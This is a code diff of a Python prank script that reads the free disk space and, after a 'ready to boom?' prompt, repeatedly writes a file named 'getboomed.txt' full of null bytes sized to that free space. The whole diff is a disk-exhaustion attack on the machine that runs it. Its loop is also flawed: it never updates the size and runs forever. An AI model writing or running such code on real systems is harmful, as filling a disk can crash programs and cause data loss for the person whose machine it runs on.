@@ -6,8 +6,14 @@ def free(path):
     return yes.replace(")","")
 print("Bytes Free:",free(path))
 FILENAME = "getboomed.txt"
-SIZE = free(path)
+SIZE = int(free(path))
 okay = input("Are you ready to boom? Type anything to start!")
-with open(FILENAME, "wb") as file:
-    file.seek(SIZE - 1)
-    file.write(b"\0")
+while True:
+    if SIZE > 100:
+        with open(FILENAME, "wb") as file:
+            file.write(b"\0" * SIZE)
+            print("Bytes Free:",free(path))
+            print("DONE BOOMBOOM")
+    print("If you are seeing this than the PC has ran out of space. Bytes left: ", SIZE)
+
+    
